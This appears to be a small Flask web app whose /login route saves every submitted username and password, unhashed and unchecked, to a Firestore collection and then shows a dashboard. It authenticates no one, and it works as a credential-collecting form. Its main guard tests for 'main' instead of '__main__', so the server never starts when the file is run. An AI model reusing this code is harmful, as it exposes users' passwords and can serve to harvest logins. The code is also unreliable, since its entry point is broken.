
from flask import Flask, render_template, request
import firebase_admin
from firebase_admin import credentials, firestore

app = Flask(__name__)
cred = credentials.Certificate("firebase-key.json")
firebase_admin.initialize_app(cred)

db = firestore.client()
@app.route("/")
def home():
    return render_template("index.html")
@app.route("/login", methods=["POST"])
def login():
    username = request.form["username"]
    password = request.form["password"]

    db.collection("users").add({
        "username": username,
        "password": password
    })

    return render_template("dashboard.html")
if __name__ == "main":
    app.run(host="0.0.0.0", port=5000)